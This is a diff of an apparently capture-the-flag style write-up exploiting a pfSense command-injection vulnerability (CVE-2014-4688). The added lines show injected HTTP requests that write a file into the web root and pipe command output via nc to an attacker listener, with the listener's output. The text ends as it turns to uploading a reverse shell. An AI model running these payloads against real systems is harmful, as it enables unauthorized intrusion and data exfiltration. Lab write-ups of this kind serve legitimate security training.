@@ -668,4 +668,27 @@ After this is done, let's navigate to the file `https://10.129.73.176/cmd.txt` w
 
 Unfortunately, we get a `404 - Not Found` error. This is probably because we are in the wrong directory `/var/db/rrd`, and we won't be able to access this file at `/var/db/rrd/cmd.txt` from the browser.
 
-If we wanted, we could do `queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"CMD+INJECT">cmd.txt`, navigating to the pfSense DocumentRoot folder which is on path `/usr/local/www/cmd.txt`.  This step is just following the [article presenting the CVE-2014-4688 vulnerability which existed in this pfSense version](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/).
+If we wanted, we could do `GET /status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"CMD+INJECT">cmd.txt HTTP/1.1`, then navigating to the pfSense DocumentRoot folder which is on path `/usr/local/www/cmd.txt`.  This step is just following the [article presenting the CVE-2014-4688 vulnerability which existed in this pfSense version](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/). Let's try it.
+
+![newinject](https://user-images.githubusercontent.com/21957042/119258656-3679bd00-bbfd-11eb-825e-8facf58cce76.png)
+
+Let's go `https://10.129.147.36/cmd.txt` and see if we see our file.
+
+![successfulinject](https://user-images.githubusercontent.com/21957042/119258659-37125380-bbfd-11eb-84c2-abbb2408dd60.png)
+
+Indeed, it works! We could potentially upload a reverse shell here and manually get C2 this way.
+
+Another alternative is by running commands, and piping it over via nc to view the output. For example, we could start a nc listener and do `GET /status_rrd_graph_img.php?database=queues;pwd|nc+10.10.x.x+1234 HTTP/1.1`. Let's see what we get.
+
+![command](https://user-images.githubusercontent.com/21957042/118416180-f8ead080-b6e0-11eb-9377-2de9ad1fbd4e.png)
+
+```
+hippoeug@kali:~$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.x.x] from (UNKNOWN) [10.129.73.176] 5374
+/var/db/rrd
+hippoeug@kali:~$ 
+```
+This works! 
+
+Now let's try the most complex of them all, uploading a reverse shell.
